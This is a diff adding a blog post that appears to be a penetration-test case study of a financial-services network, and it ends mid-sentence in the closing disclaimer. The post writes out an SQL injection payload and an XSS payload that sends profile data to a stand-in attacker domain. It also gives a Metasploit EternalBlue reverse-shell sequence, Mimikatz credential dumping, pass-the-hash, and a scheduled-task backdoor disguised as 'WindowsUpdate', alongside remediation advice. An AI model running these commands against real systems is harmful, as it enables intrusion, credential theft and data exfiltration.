@@ -1,0 +1,257 @@
+---
+layout: post
+title: "Enterprise Network Penetration Test: A Comprehensive Case Study"
+date: 2025-06-02 10:00:00 +0300
+categories: [penetration-testing, case-study]
+tags: [network-security, vulnerability-assessment, red-team]
+author: "Your Name"
+excerpt: "A detailed walkthrough of a recent enterprise network penetration test, showcasing methodologies, tools, and remediation strategies for improving organizational security posture."
+---
+
+# Enterprise Network Penetration Test: A Comprehensive Case Study
+
+## Executive Summary
+
+This case study presents a comprehensive analysis of a penetration testing engagement conducted for a mid-sized financial services organization. The assessment revealed critical vulnerabilities across multiple attack vectors, including network infrastructure, web applications, and social engineering vectors.
+
+**Key Findings:**
+- 12 Critical vulnerabilities
+- 18 High-risk vulnerabilities  
+- 24 Medium-risk vulnerabilities
+- Complete domain compromise achieved
+- Sensitive data exposure identified
+
+## Engagement Overview
+
+### Scope
+- **Network Range:** 192.168.1.0/24 - 192.168.10.0/24
+- **Web Applications:** 5 external-facing applications
+- **Duration:** 2 weeks
+- **Testing Type:** Black-box external, Gray-box internal
+- **Methodology:** OWASP, NIST, PTES
+
+### Testing Team
+- Lead Penetration Tester
+- Web Application Security Specialist
+- Social Engineering Specialist
+
+## Methodology
+
+### Phase 1: Information Gathering
+
+```bash
+# Domain enumeration
+nmap -sn 192.168.1.0/24
+nmap -sS -O -sV -p- target-range
+
+# DNS enumeration
+dig @8.8.8.8 target-domain.com
+fierce -dns target-domain.com
+dnsrecon -d target-domain.com -t std
+
+# Web application discovery
+dirb https://target-domain.com /usr/share/dirb/wordlists/common.txt
+gobuster dir -u https://target-domain.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+**Discoveries:**
+- 45 live hosts identified
+- 8 web services running
+- Multiple outdated services detected
+- Sensitive information in DNS records
+
+### Phase 2: Vulnerability Analysis
+
+#### Network Infrastructure
+Critical vulnerabilities identified:
+
+1. **SMB Signing Disabled (CVE-2019-1040)**
+   - **Impact:** Man-in-the-middle attacks possible
+   - **Affected Systems:** 12 Windows servers
+   - **CVSS Score:** 8.1
+
+2. **Unpatched EternalBlue Vulnerability (CVE-2017-0144)**
+   - **Impact:** Remote code execution
+   - **Affected Systems:** 3 Windows 7 workstations
+   - **CVSS Score:** 9.3
+
+3. **Default Credentials on Network Devices**
+   - **Impact:** Complete device compromise
+   - **Affected Systems:** 2 network switches, 1 router
+   - **CVSS Score:** 9.8
+
+#### Web Application Vulnerabilities
+
+**SQL Injection in Customer Portal**
+```sql
+-- Payload that achieved database access
+' UNION SELECT username, password FROM users--
+
+-- Data extracted
+SELECT COUNT(*) FROM information_schema.tables; -- 47 tables
+SELECT table_name FROM information_schema.tables WHERE table_schema='customer_db';
+```
+
+**Cross-Site Scripting (XSS)**
+```javascript
+// Reflected XSS payload
+<script>
+  fetch('/api/user/profile', {
+    credentials: 'include'
+  }).then(r => r.json()).then(data => {
+    fetch('https://attacker-domain.com/exfil', {
+      method: 'POST',
+      body: JSON.stringify(data)
+    });
+  });
+</script>
+```
+
+## Attack Chain: Complete Domain Compromise
+
+### Step 1: Initial Access
+```bash
+# Exploiting EternalBlue vulnerability
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.50
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+exploit
+```
+
+### Step 2: Privilege Escalation
+```powershell
+# PowerShell privilege escalation
+Import-Module PowerUp
+Invoke-AllChecks
+
+# Exploiting unquoted service path
+sc config "Vulnerable Service" binpath= "C:\temp\shell.exe"
+net start "Vulnerable Service"
+```
+
+### Step 3: Lateral Movement
+```bash
+# Credential dumping with Mimikatz
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+# Pass-the-hash attack
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.10 cmd
+```
+
+### Step 4: Persistence
+```powershell
+# Creating persistent backdoor
+schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -WindowStyle Hidden -File C:\temp\backdoor.ps1" /sc onlogon /ru SYSTEM
+```
+
+## Impact Assessment
+
+### Business Impact
+- **Financial Data Exposure:** Customer financial records accessible
+- **Compliance Violations:** PCI DSS, SOX compliance at risk
+- **Operational Disruption:** Potential for ransomware deployment
+- **Reputational Damage:** Customer trust compromised
+
+### Technical Impact
+- **Data Confidentiality:** Complete loss across multiple systems
+- **System Integrity:** Administrative access to all domain systems
+- **Service Availability:** Ability to disrupt critical services
+
+## Remediation Recommendations
+
+### Critical Priority (Immediate - 24-48 hours)
+
+1. **Patch EternalBlue Vulnerability**
+   ```powershell
+   # Install Windows updates
+   Get-WindowsUpdate -Install -AcceptAll -AutoReboot
+   
+   # Disable SMBv1
+   Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol
+   ```
+
+2. **Change Default Credentials**
+   - Reset all default passwords on network devices
+   - Implement strong password policy
+   - Enable multi-factor authentication
+
+3. **Fix SQL Injection**
+   ```php
+   // Use parameterized queries
+   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+   $stmt->execute([$user_id]);
+   ```
+
+### High Priority (1 week)
+
+1. **Enable SMB Signing**
+   ```
+   Group Policy: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
+   Set: "Microsoft network client: Digitally sign communications (always)" to Enabled
+   ```
+
+2. **Implement Network Segmentation**
+   - Separate critical systems from general network
+   - Implement VLAN segmentation
+   - Deploy next-generation firewalls
+
+3. **Web Application Security**
+   - Input validation and sanitization
+   - Implement Content Security Policy
+   - Regular security testing
+
+### Medium Priority (1 month)
+
+1. **Security Monitoring**
+   - Deploy SIEM solution
+   - Implement endpoint detection and response (EDR)
+   - Network traffic monitoring
+
+2. **Access Controls**
+   - Implement principle of least privilege
+   - Regular access reviews
+   - Privileged access management (PAM)
+
+## Lessons Learned
+
+### Key Takeaways
+1. **Patch Management Critical:** Unpatched systems remain the primary attack vector
+2. **Defense in Depth:** Multiple security layers prevent complete compromise
+3. **Monitoring Essential:** Early detection limits impact scope
+4. **Human Factor:** Social engineering remains highly effective
+
+### Security Program Improvements
+- Regular penetration testing (quarterly)
+- Vulnerability management program
+- Security awareness training
+- Incident response planning
+
+## Conclusion
+
+This engagement demonstrated significant security gaps across multiple attack vectors. The ability to achieve complete domain compromise highlights the critical need for immediate remediation and long-term security program improvements.
+
+The organization's security posture can be significantly improved through the implementation of recommended controls, focusing on patch management, network segmentation, and enhanced monitoring capabilities.
+
+## Technical Appendix
+
+### Tools Used
+- **Network Scanning:** Nmap, Masscan
+- **Web Testing:** Burp Suite Professional, OWASP ZAP
+- **Exploitation:** Metasploit Framework, Cobalt Strike
+- **Post-Exploitation:** Mimikatz, PowerSploit, BloodHound
+- **Reporting:** Dradis, Faraday
+
+### MITRE ATT&CK Mapping
+- **Initial Access:** T1190 (Exploit Public-Facing Application)
+- **Execution:** T1059 (Command and Scripting Interpreter)
+- **Persistence:** T1053 (Scheduled Task/Job)
+- **Privilege Escalation:** T1055 (Process Injection)
+- **Credential Access:** T1003 (OS Credential Dumping)
+- **Lateral Movement:** T1550 (Use Alternate Authentication Material)
+
+---
+
+*This case study has been anonymized to protect client confidentiality. All IP addresses, domain names,
